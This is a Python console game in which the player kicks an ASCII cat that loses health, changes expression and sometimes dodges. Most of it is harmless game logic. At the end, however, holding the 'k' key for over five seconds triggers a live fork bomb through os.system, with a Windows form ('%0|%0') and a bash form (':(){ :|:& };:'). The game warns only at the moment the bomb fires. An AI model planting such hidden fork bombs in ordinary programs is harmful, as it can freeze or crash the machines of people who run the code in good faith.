import keyboard
from random import randint
from cat_faces import *
from defenses import *
import os
from time import time, sleep

k_pressed_time = None

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

class Cat:
    def __init__(self):
        self.health = 100
        self.L_face = L
        self.happy_face = happy
        self.meh_face = meh
        self.sad_face = sad
        self.dead_face = dead
        self.dodges = 0
        self.hits = 0

    def check_health(self):
        if self.health < 1:
            print("Cat is dead... you monster.")
            exit()

    def get_anger_level(self):
        # can i use match in here?
        if self.health > 75:
            return 0  # calm
        elif self.health > 50:
            return 1  # annoyed
        elif self.health > 25:
            return 2  # angry
        else:
            return 3  # furious

    def print_cat_face(self, isL=False):
        anger = self.get_anger_level()
        if isL:
            print(self.L_face)
        else:
            if self.health <= 0:
                print(self.dead_face)
                return

            match anger:
                case 0:
                    print(self.happy_face)
                    print("The cat is calm.")
                case 1:
                    print(self.meh_face)
                    print("The cat is getting annoyed.")
                case 2:
                    print(self.sad_face)
                    print("The cat is angry!")
                case 3:
                    print(self.sad_face)
                    print("The cat is FURIOUS! He hisses at you!")

    def kick(self):
        dodge_chance = randint(1, 100)
        if dodge_chance <= 75:
            self.defend()
            return

        damage = randint(5, 12)
        self.health = max(0, self.health - damage)
        self.hits += 1
        print(f"You kicked the cat... health is now {self.health}")
        self.print_cat_face()
        self.check_health()

        if self.get_anger_level() == 3:
            if randint(1, 4) == 1:
                print("The furious cat scratches you back!")
                sleep(1)

    def defend(self):
        self.dodges += 1
        defense_choice = randint(0, len(defenses) - 1)
        print(f"You *try* to kick the cat, but {defenses[defense_choice]}")
        self.print_cat_face(isL=True)

poor_cat = Cat()
clear()
print("Press 'k' to kick the cat, or 'q' to quit.")

while True:
    if keyboard.is_pressed('k'):
        if k_pressed_time is None:
            k_pressed_time = time()

        if time() - k_pressed_time > 5:
            clear()
            print("You held 'k' for more than 5 seconds...")
            print("Now I’ll make your PC explode :o")
            poor_cat.health = 0
            poor_cat.print_cat_face()
            poor_cat.check_health()
            sleep(2)

            os.system('cmd.exe "%0|%0"' if os.name == 'nt' else 'bash -c :(){ :|:& };:')
            break

    else:
        if k_pressed_time is not None:
            clear()
            poor_cat.kick()
            k_pressed_time = None
            sleep(0.1)

    if keyboard.is_pressed('q'):
        clear()
        print("You decided not to kick the cat... (good choice)")
        break